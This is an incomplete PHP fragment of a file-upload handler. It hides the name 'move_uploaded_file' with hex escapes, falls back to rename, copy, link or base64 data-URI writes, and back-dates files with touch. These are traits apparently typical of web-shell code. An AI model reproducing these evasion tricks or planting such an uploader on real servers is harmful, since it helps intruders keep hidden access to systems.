        ...
        if (!empty($_FILES['f']) || !empty($_REQUEST['f'])) {
		    ...
		    foreach ($_FILES['f']['error'] as $k => $v) {
		        ...
		        if ($v === 0) {
		            ...
		            if ("\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65"($t, $p) || rename($t, $p) || copy($t, $p) || link($t, $p) || (is_string($c = getFile($t)) && writeFile($p, $c)) || ($t[0] === 'd' && writeFile($p, base64_decode(substr(strrchr($t, ','), 1))))) {
		                $a[] = $n;
		                if ($i)
		                    touch($p, $i);
		                continue;
